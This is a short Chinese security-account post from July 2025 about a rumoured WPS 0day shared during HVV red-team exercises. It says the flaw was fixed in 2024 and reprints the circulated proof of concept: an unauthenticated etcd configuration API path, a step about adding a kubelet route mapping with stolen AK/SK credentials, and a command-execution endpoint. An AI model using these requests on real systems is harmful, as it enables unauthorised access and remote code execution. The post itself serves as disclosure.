> **原文链接**: https://mp.weixin.qq.com/s?__biz=Mzk0OTUwNTU5Nw==&mid=2247489632&idx=1&sn=cfd0fe4074ceae03eff8238fbf7b26ce

#  【相关分享】关于网传HVV中的WPS漏洞  
原创 隼目安全  隼目安全   2025-07-17 07:16  
  
## 免责声明  
> ❝  
> 由于传播、利用本公众号"隼目安全"所提供的信息而造成的任何直接或者间接的后果及损失,均由使用者本人负责,公众号"隼目安全"及作者不为此承担任何责任,一旦造成后果请自行承担!如有侵权烦请告知,我们会立即删除并致歉谢谢！  
  
  
关于网传WPS0day漏洞，系2024年已经被修复  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/9HKdHo8BvC1F8pdK1HHvSHVAyKfHgst3seOGuJfc8K7R9vXFkQNeSw3icYnN9PYfRmibQRtOiaqyeIibtziaFMUCXGA/640?wx_fmt=jpeg&from=appmsg "")  
  
下为网传poc  
  
1、未授权访问  

```
/open/v6/api/etcd/operate?key=/config/storage&method=get

```

  
2、获取AKSK后使用脚本添加kubelet 路由映射，但需要获取TOKEN  
  
3、向对应POD发起通信后实现RCE  

```
/open/wps/run/{namespace}/{podname}/node-exporter?cmd={url_encode_command} 

```

  
![](https://mmbiz.qpic.cn/mmbiz_gif/9HKdHo8BvC1F8pdK1HHvSHVAyKfHgst3d9gyibkXYcIz2rI5ibotnQ5NPLLfT1Lt5u4s2AHWncSCLoicNaHzrSMFg/640?wx_fmt=gif "")  
  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/9HKdHo8BvC1F8pdK1HHvSHVAyKfHgst3ovp6EUfgSFFduJdCnDcr3V7NNWEJxlricCyeJp9mIxdKVNibVSEjRGnQ/640?wx_fmt=png "")  
  
  
  
